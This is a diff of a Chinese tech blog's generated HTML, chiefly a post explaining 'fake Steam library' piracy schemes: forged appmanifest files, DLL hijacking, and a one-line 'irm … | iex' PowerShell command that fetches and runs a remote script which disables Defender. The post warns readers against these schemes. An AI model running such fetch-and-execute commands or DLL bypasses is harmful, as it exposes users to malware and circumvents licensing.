-<p>2、自动：- 关 Defender &#x2F; 加排除</p>
-<p>3、改注册表</p>
-<p>4、替换 DLL</p>
-<p>5、写入假 manifest</p>
-<p>6、全程管理员权限，电脑完全敞开</p>
-<p>一般情况下，不太建议这么搞，因为其本身是下载第三方的脚本文件，不知道其有没有被植入后门或者病毒。</p>
-<p>对于假入库也有不少工具，但是这里也不建议，因为有红锁的风险。</p>
-<p><strong><em>2、关于D加密</em></strong></p>
-<p>有的人在找破解资源的时候，可能会有什么开启虚拟化的过程。</p>
-<p>其本质是关闭电脑上所有的验证，让其不能验证，就可以绕开了，但是本身还是和上面的原理差不多的，而且搞那些虚拟化有被病毒感染的风险和电脑性能会有损耗，</p>
-<p><strong><em>3、防范</em></strong></p>
-<p>一般不要下来历不明的软件和买cdk时，如果要你干什么cmd输命令的都是假的，一般是会直接给激活码然后激活就行，不要贪便宜，还有一些是礼物发货，这个有被收回的风险。</p>
-<p>总结：反正一般不贪便宜基本上问题不大。</p>
+<p>HDSky像这种都有一定的门槛，一般其注册都很少而且是在节假日才开放，开放时间很短，一般要内部人员推送才行，而且进去了还有上传的任务，不然很快号就没了，所以，一般不要轻信那些什么卖号的。</p>
+<p>总结：相比于BT其PT资源跟好，但是门槛跟高。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/15/2026/05/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/" data-id="cuidQFob0-QtTHl1zsbNoJgx4" data-title="steam假入库" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/16/2026/05/2026-05-16-%E5%85%B3%E4%BA%8Ept/index/" data-id="cuidqXxIcF4gsPiOqXgRZRByc" data-title="关于PT" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -702,7 +609,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/15/2026/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/" data-id="cuidHNK3v1c1SBDotrB5in-ls" data-title="steam假入库" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/15/2026/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/" data-id="cuidZW2XnRwv5_65IJJ3XuRT2" data-title="steam假入库" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -714,14 +621,14 @@
 
 
   
-    <article id="post-2026/05/2026-05-14-进程加速器（openspeedy）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-2026/05/2026-05-15-steam假入库/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/05/14/2026/05/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/" class="article-date">
-  <time class="dt-published" datetime="2026-05-13T16:00:00.000Z" itemprop="datePublished">2026-05-14</time>
+    <a href="/2026/05/15/2026/05/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/" class="article-date">
+  <time class="dt-published" datetime="2026-05-14T16:00:00.000Z" itemprop="datePublished">2026-05-15</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/">开源项目</a>
+    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/">其他知识</a>
   </div>
 
   </div>
@@ -732,7 +639,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/05/14/2026/05/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/">进程加速器（openspeedy）</a>
+      <a class="p-name article-title" href="/2026/05/15/2026/05/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/">steam假入库</a>
     </h1>
   
 
@@ -740,26 +647,62 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>注：本项目只适用于加速单机游戏，如果用用于其他造成的后果自行负责。</p>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/game1024/OpenSpeedy">game1024&#x2F;OpenSpeedy：🎮开源游戏速度修正器。 — game1024&#x2F;OpenSpeedy: 🎮 An open-source game speed modifier.</a></p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/game1024/OpenSpeedy/releases/download/v1.7.9/Speedy-1.7.9.zip">https://github.com/game1024/OpenSpeedy/releases/download/v1.7.9/Speedy-1.7.9.zip</a></p>
-<p>1、作用</p>
-<p>跳过单机游戏的漫长等待时间，用于单机游戏的进程加速。</p>
-<p>用于电脑上的exe程序进程的单独的加速。</p>
-<p>2、原理</p>
-<p>通过修改进程的系统时间读数器到达修改程序进程的目的。</p>
-<p>具体原理可以看看作者的项目文档。</p>
-<p>3、使用</p>
-<p>下载以后解压</p>
-<p>在下面进程里找到你要加速的程序勾选后滑动上面的加速的倍数就行。</p>
-<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-05-14-185949-1024x609.png"></p>
-<p>操作很简单，不用修改注册表什么的，可以极大的方便你使用。</p>
-<p>总结：这是一个很好用的开源软件，希望大家可以去支持一下作者，并遵守作者的开源协议。</p>
+        <p>注：本文章主要讲解steam假入库的原理和风险。</p>
+<p>1、原理</p>
+<p>Steam 是本地+云端双重验证的方式：</p>
+<p>1. 云端：账号绑定的 License（许可证），官方数据库记录。<br>2. 本地：-  Steam\steamapps\appmanifest_.acf （清单文件）</p>
+<ul>
+<li><p> Steam\config\config.vdf （下载密钥）</p>
+</li>
+<li><p>Steam 客户端启动时优先读本地缓存 → 有就显示“已拥有”</p>
+</li>
+</ul>
+<p>假入库核心逻辑：不上传云端，在本地骗过客户端然后让他认为你电脑上有了这个游戏。</p>
+<p><strong><em>1、伪造 appmanifest（最基础）</em></strong></p>
+<ul>
+<li><p>手动&#x2F;脚本生成  appmanifest_12345.acf </p>
+</li>
+<li><p>写入  steamapps  文件夹</p>
+</li>
+<li><p>Steam 刷新库 → 直接显示已安装&#x2F;已拥有</p>
+</li>
+<li><p>缺点：不能下载，只能骗库显示</p>
+</li>
+</ul>
+<p><strong><em>2、DLL 劫持（hid.dll &#x2F; steam_api.dll）</em></strong></p>
+<ul>
+<li><p>替换 Steam 目录下  hid.dll  或注入  steam_api64.dll </p>
+</li>
+<li><p>拦截 Steam 验证请求，返回“已授权”假结果</p>
+</li>
+<li><p>可正常下载、玩单机</p>
+</li>
+<li><p>风险最高：红信、盗号、木马</p>
+</li>
+</ul>
+<p><strong><em>3、PowerShell 脚本一键执行（现在最常见）</em></strong></p>
+<p>一般就是（网上几块钱卖的基本上是这玩意）</p>
+<p>irm steam.work | iex  
+ </p>
+<p>1、从陌生网站下载脚本&#x2F;恶意程序</p>
+<p>2、自动：- 关 Defender &#x2F; 加排除</p>
+<p>3、改注册表</p>
+<p>4、替换 DLL</p>
+<p>5、写入假 manifest</p>
+<p>6、全程管理员权限，电脑完全敞开</p>
+<p>一般情况下，不太建议这么搞，因为其本身是下载第三方的脚本文件，不知道其有没有被植入后门或者病毒。</p>
+<p>对于假入库也有不少工具，但是这里也不建议，因为有红锁的风险。</p>
+<p><strong><em>2、关于D加密</em></strong></p>
+<p>有的人在找破解资源的时候，可能会有什么开启虚拟化的过程。</p>
+<p>其本质是关闭电脑上所有的验证，让其不能验证，就可以绕开了，但是本身还是和上面的原理差不多的，而且搞那些虚拟化有被病毒感染的风险和电脑性能会有损耗，</p>
+<p><strong><em>3、防范</em></strong></p>
+<p>一般不要下来历不明的软件和买cdk时，如果要你干什么cmd输命令的都是假的，一般是会直接给激活码然后激活就行，不要贪便宜，还有一些是礼物发货，这个有被收回的风险。</p>
+<p>总结：反正一般不贪便宜基本上问题不大。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/14/2026/05/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/" data-id="cuidKTZjEfQLbUuuylTEqcMY3" data-title="进程加速器（openspeedy）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/15/2026/05/2026-05-15-steam%E5%81%87%E5%85%A5%E5%BA%93/index/" data-id="cuid3x6jYE3pQjrG3MxCD7Y4a" data-title="steam假入库" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -816,7 +759,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/14/2026/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/" data-id="cuidm_zlxw4OlCUY6tQG20EvU" data-title="进程加速器（openspeedy）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/14/2026/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/" data-id="cuidimYbVBa00-ACoRhElI3Qz" data-title="进程加速器（openspeedy）" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -828,9 +771,66 @@
 
 
   
-    <article id="post-2026/05/2026-05-13-系统还原/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-2026/05/2026-05-14-进程加速器（openspeedy）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/05/13/2026/05/2026-05-13-%E7%B3%BB%E7%BB%9F%E8%BF%98%E5%8E%9F/index/" class="article-date">
+    <a href="/2026/05/14/2026/05/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-05-13T16:00:00.000Z" itemprop="datePublished">2026-05-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/">开源项目</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/05/14/2026/05/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/">进程加速器（openspeedy）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：本项目只适用于加速单机游戏，如果用用于其他造成的后果自行负责。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/game1024/OpenSpeedy">game1024&#x2F;OpenSpeedy：🎮开源游戏速度修正器。 — game1024&#x2F;OpenSpeedy: 🎮 An open-source game speed modifier.</a></p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/game1024/OpenSpeedy/releases/download/v1.7.9/Speedy-1.7.9.zip">https://github.com/game1024/OpenSpeedy/releases/download/v1.7.9/Speedy-1.7.9.zip</a></p>
+<p>1、作用</p>
+<p>跳过单机游戏的漫长等待时间，用于单机游戏的进程加速。</p>
+<p>用于电脑上的exe程序进程的单独的加速。</p>
+<p>2、原理</p>
+<p>通过修改进程的系统时间读数器到达修改程序进程的目的。</p>
+<p>具体原理可以看看作者的项目文档。</p>
+<p>3、使用</p>
+<p>下载以后解压</p>
+<p>在下面进程里找到你要加速的程序勾选后滑动上面的加速的倍数就行。</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-05-14-185949-1024x609.png"></p>
+<p>操作很简单，不用修改注册表什么的，可以极大的方便你使用。</p>
+<p>总结：这是一个很好用的开源软件，希望大家可以去支持一下作者，并遵守作者的开源协议。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/05/14/2026/05/2026-05-14-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88openspeedy%EF%BC%89/index/" data-id="cuiddeubbaO0owF1uFm01G2N9" data-title="进程加速器（openspeedy）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/2026-05-13-系统还原/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/05/13/2026/2026-05-13-%E7%B3%BB%E7%BB%9F%E8%BF%98%E5%8E%9F/index/" class="article-date">
   <time class="dt-published" datetime="2026-05-12T16:00:00.000Z" itemprop="datePublished">2026-05-13</time>
 </a>
     
@@ -846,7 +846,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/05/13/2026/05/2026-05-13-%E7%B3%BB%E7%BB%9F%E8%BF%98%E5%8E%9F/index/">系统还原</a>
+      <a class="p-name article-title" href="/2026/05/13/2026/2026-05-13-%E7%B3%BB%E7%BB%9F%E8%BF%98%E5%8E%9F/index/">系统还原</a>
     </h1>
   
 
@@ -878,7 +878,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/05/13/2026/05/2026-05-13-%E7%B3%BB%E7%BB%9F%E8%BF%98%E5%8E%9F/index/" data-id="cuidPbCCYH8US3UldfTYvUvZi" data-title="系统还原" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/05/13/2026/2026-05-13-%E7%B3%BB%E7%BB%9F%E8%BF%98%E5%8E%9F/index/" data-id="cuid2oWUypr6ZaGJKFFT5c-fM" data-title="系统还原" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
